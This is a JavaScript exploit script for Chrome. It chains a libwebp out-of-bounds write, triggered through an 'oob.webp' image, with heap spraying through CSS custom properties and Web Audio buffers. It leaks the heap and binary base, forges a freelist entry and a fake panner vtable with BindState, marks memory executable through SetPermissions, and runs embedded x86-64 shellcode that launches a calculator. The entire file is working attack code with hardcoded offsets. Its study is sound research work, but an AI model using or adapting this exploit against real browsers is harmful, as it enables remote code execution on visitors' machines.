// chrome addrs
const kHRTFPannerVtableOffset = 0xf002588n;
const kWriteListenerOffset = 0xd695130n; // blink::FileSystemDispatcher::WriteListener::DidWrite
const kPolymorphicInvokeOffset = 0x68a09e0n; // callback binded in ServiceWorkerContextCore::OnControlleeRemoved
const kRetOffset = kWriteListenerOffset + 107n;
const kOSSetPermissionsOffset = 0xa0fe940n;

const kShellcode = [0x6a, 0x3b, 0x58, 0x99, 0x48, 0x8d, 0x3d, 0x11, 0x00, 0x00, 0x00, 0x52, 0x57, 0x54, 0x5e, 0x48, 0x8d, 0x1d, 0x20, 0x00, 0x00, 0x00, 0x52, 0x53, 0x54, 0x5a, 0x0f, 0x05, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x31, 0x00]; // pop calc
const kOverwriteRef = 0x3aa07;
// this string size +0x34, fits into 0x3000 bucket
const kCSSString = 'A'.repeat(0x2f00);
// HRTFPanner sized 0x448, fits into 0x500(?) bucket
const kCSSString2 = 'A'.repeat(0x414); // 0x414 + 0x34 == 0x448
const kSprayPannerCount = 10;
const kTargetCSSVar = '--a33.2'; // this may differ depends on environment


const audioCtx = new OfflineAudioContext(1, 4096, 4096);
var panners = [];
var audioCtxArr = [];
var delayNodeArr = [];
var srcNodeArr = [];
var heapAddr = -1n;
var chromeBase = -1n;


function gc() {
  let x = [];
  for (let i = 0; i < 200; i++) {
    x.push(new Array(1024 * 1024));
  }
}

async function allocAudioArray(size, data, count) {
  const delay = ((size - 0x20) / 4 - 0x80) / 4096;
  const prevCount = audioCtxArr.length;
  for (let i = 0; i < count; i++) {
    let audioCtxDelay = new OfflineAudioContext(1, 4096, 4096);
    // will alloc ((delay * 4096 * 1024) / 1024 + 0x80) * 4 + 0x20
    let delayNode = audioCtxDelay.createDelay(delay);
    audioCtxArr.push(audioCtxDelay);
    delayNodeArr.push(delayNode);
  }

  // FIXME: only the first 0x600 is controled now
  // buffer content is getting weird when size is big
  if (data.byteLength > 0x600)
    die('data too long for Audio Array');
  let buffer = audioCtx.createBuffer(1, 0x600, 4096);
  let dstData = buffer.getChannelData(0);
  new Uint8Array(dstData.buffer).set(new Uint8Array(data));

  for (let i = 0; i < count; i++) {
    let audioCtxDelay = audioCtxArr[prevCount + i];
    let delayNode = delayNodeArr[prevCount + i];
    let srcNode = audioCtxDelay.createBufferSource();
    srcNodeArr.push(srcNode);
    srcNode.buffer = buffer;
    srcNode.connect(delayNode).connect(audioCtxDelay.destination);
    // audioCtxDelay.suspend(1);
    audioCtxDelay.suspend(0x600 / 4096.0);
    srcNode.start();
    audioCtxDelay.startRendering();
  }
  await sleep(500);
}

async function exploit() {
  let div0 = document.getElementById('div0');
  let img = document.createElement('img');
  img.src = 'oob.webp';

  // clear thread cache first, alloc a new super page
  for (let i = 0; i < 200; i++) {
    div0.style.setProperty(`--sprayA${i}`, kCSSString);
    for (let j = 0; j < 8; j++) {
      div0.style.setProperty(`--sprayB${i}.${j}`, kCSSString2);
    }
  }

  // prepare
  // 32 * 0x500 = 0xa000, occupy 3 partition pages
  // 4 * 0x3000 = 0xc000, occupy 3 partition pages
  for (let i = 0; i < 50; i++) {
    for (let j = 0; j < 7; j++) {
      div0.style.setProperty(`--a${i}.${j}`, kCSSString);
    }
    for (let j = 0; j < 64; j++) {
      const CSSValName = `${i}.${j}`.padEnd(0x414, 'A')
      div0.style.setProperty(`--b${i}.${j}`, CSSValName);
    }
  }
  // fill thread cache, trigger ClearBucket(bucket, limit / 2)
  for (let i = 30; i < 30 + 16; i++)
    div0.style.removeProperty(`--a${i}.0`);

  gc(); await sleep(1000);

  let rs = getComputedStyle(div0);
  // add ref_count with kOverwriteRef
  for (let i = 0; i < kOverwriteRef; i++) {
    rs.getPropertyValue(kTargetCSSVar);
  }
  // trigger OOB in libwebp
  document.body.appendChild(img);
  await sleep(500);

  // trigger gc to sub ref_count and free CSSVariableData
  gc();
  setTimeout(leak, 1000);
}

async function leak() {
  // target CSSVariableData is freed now, alloc AudioArray to occupy it
  let ab = new ArrayBuffer(0x600);
  let view = new Uint32Array(ab);
  // fake CSSVariableData
  view[0] = 2; // ref_count
  const newCSSVarLen = 0xc000; // read 1 slot span is enough
  console.assert(newCSSVarLen <= 2097152, 'CSS variable too long'); // kMaxVariableBytes
  view[1] = newCSSVarLen | 0x01000000; // length and flags, set is_8bit_
  for (let i = 2; i < view.length; i++)
    view[i] = i;
  await allocAudioArray(0x3000, ab, 1);

  let div0 = document.getElementById('div0');
  let rs = getComputedStyle(div0);
  let CSSLeak = rs.getPropertyValue(kTargetCSSVar).substring(0x3000 - 8);
  // console.log(CSSLeak.hex());
  CSSVars = [...CSSLeak.matchAll(/\x02\x00\x00\x00\x14\x04\x00\x01(\d+\.\d+)/g)];
  console.log(CSSVars);
  if (CSSVars.length < kSprayPannerCount)
    die('leak failed');

  for (let i = 0; i < kSprayPannerCount; i++) {
    panners.push(audioCtx.createPanner());
  }
  for (let i = 0; i < kSprayPannerCount; i++) {
    // console.log(`removing --b${var_name[i]}`);
    div0.style.removeProperty(`--b${CSSVars[i][1]}`);
  }
  gc(); await sleep(1000);

  for (let i = 0; i < panners.length; i++) {
    panners[i].panningModel = 'HRTF';
  }
  // free two panners after target CSSVariableData
  panners[kSprayPannerCount - 2].panningModel = 'equalpower';
  panners[kSprayPannerCount - 1].panningModel = 'equalpower';
  let hrtfLeak = rs.getPropertyValue(kTargetCSSVar).substring(0x3000 - 8);
  console.log(hrtfLeak.hex());

  // freelist is stored in big endian
  heapAddr = u64(hrtfLeak.substring(CSSVars[0].index, CSSVars[0].index + 8), false) - 0xa00n;
  chromeBase = u64(hrtfLeak.substring(CSSVars[1].index, CSSVars[1].index + 8)) - kHRTFPannerVtableOffset;
  if (heapAddr < 0n)
    die('leak failed');
  log('heap address: ' + heapAddr.hex());
  log('chrome base: ' + chromeBase.hex());

  gc();
  // final stage
  setTimeout(firstFree, 1000);
}

async function firstFree() {
  let div0 = document.getElementById('div0');
  let div1 = document.getElementById('div1');
  for (let i = 0; i < 10; i++) {
    div1.style.setProperty(`--sprayC${i}`, kCSSString);
  }
  div0.style.removeProperty(kTargetCSSVar);
  gc();
  setTimeout(secondFree, 2000);
  log('after first free');
}

async function secondFree() {
  let audioCtxDelay = audioCtxArr.pop();
  let delayNode = delayNodeArr.pop();
  let srcNode = srcNodeArr.pop();
  let delayNode2 = audioCtxDelay.createDelay(0.716796875);
  audioCtxDelay.oncomplete = () => {
    srcNode.disconnect(delayNode);
    delayNode.disconnect(audioCtxDelay.destination);
    delete srcNode;
    delete delayNode;
    delete delayNode2;
    delete audioCtxDelay;
    log('delay nodes deleted');
    gc(); gc();
    setTimeout(trigger, 5000);
  };
  audioCtxDelay.resume();
}

async function trigger() {
  // now freelist is circular A --> A
  let ab = new ArrayBuffer(0x600);
  let view = new BigUint64Array(ab);
  const fakePannerAddr = BigInt(CSSVars[8].index) + heapAddr;
  log('fake freelist to ' + fakePannerAddr.hex());
  // overwrite freelist pointer, the next pointer should be 0, so we sub 0x10n
  view[0] = swapEndian(fakePannerAddr - 0x10n);
  await allocAudioArray(0x3000, ab, 1);

  // alloc the same size again
  div1.style.setProperty('--ting', kCSSString);

  view = new DataView(ab);
  for (let i = 0; i < view.byteLength; i++)
    view.setUint8(i, 0x42);

  view.setBigUint64(0, fakePannerAddr + 8n - 8n, true); // call   QWORD PTR [rax+0x8]
  view.setBigUint64(8, chromeBase + kWriteListenerOffset, true);
  view.setBigUint64(0x10, fakePannerAddr + 0x18n, true); // fake BindState addr
  // start of fake BindState
  view.setBigUint64(0x18 + 0, 1n, true); // refcount
  view.setBigUint64(0x18 + 0x8, chromeBase + kPolymorphicInvokeOffset, true); // polymorphic_invoke
  view.setBigUint64(0x18 + 0x10, chromeBase + kRetOffset, true); // destructor
  view.setBigUint64(0x18 + 0x18, chromeBase + kRetOffset, true); // query_cancellation_traits
  view.setBigUint64(0x18 + 0x20, chromeBase + kOSSetPermissionsOffset, true); // functor
  view.setBigUint64(0x18 + 0x28, (fakePannerAddr & ~0xfffn) - 0x1000n, true); // arg0
  view.setBigUint64(0x18 + 0x30, 0x2000n, true); // arg1
  view.setBigUint64(0x18 + 0x38, 0x3n, true); // arg2

  for (let i = 0; i < kShellcode.length; i++)
    view.setUint8(0x200 + i, kShellcode[i]);

  // second panner to exec shellcode
  view.setBigUint64(0x500 + 0, fakePannerAddr + 0x500n + 8n - 8n, true);
  view.setBigUint64(0x500 + 8, fakePannerAddr + 0x200n, true);

  await allocAudioArray(0x3000, ab, 1);

  log('all ready, popping calc');
  // panners[2].panningModel = 'equalpower';
  // panners[0].panningModel = 'equalpower';
  for (let i = panners.length - 3; i >= 0; i--) {
    panners[i].panningModel = 'equalpower';
  }
}
